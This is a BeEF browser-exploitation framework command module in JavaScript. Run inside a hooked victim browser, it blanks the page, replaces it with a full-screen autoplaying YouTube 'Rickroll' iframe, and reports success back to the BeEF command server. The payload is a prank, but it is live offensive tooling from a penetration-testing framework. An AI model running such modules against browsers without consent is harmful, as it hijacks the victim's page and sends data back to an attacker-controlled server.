//
// Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	$j('body').html('');

	$j('body').css({'padding':'0px', 'margin':'0px', 'height':'100%'});
	$j('html').css({'padding':'0px', 'margin':'0px', 'height':'100%'});

        $j('body').html('<iframe width="100%" height="100%" src="//www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" frameborder="0" allowfullscreen></iframe>');
	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Rickroll Successful");
});
